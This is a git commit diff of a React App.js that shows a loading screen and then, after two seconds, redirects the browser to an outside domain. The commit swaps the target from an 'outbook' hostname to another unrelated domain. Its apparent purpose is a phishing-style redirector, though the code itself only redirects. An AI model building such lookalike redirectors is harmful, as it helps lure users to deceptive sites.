9a009d216c09e5f3f9de01ccf0dc67b71590237f
husknet <127146284+husknet@users.noreply.github.com>
2024-11-20 16:51:58 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://outbook.ibewlocalzero.com';
+            window.location.href = 'https://jrry.plenario.ar';
         }, 2000);
 
         return () => clearTimeout(timer);
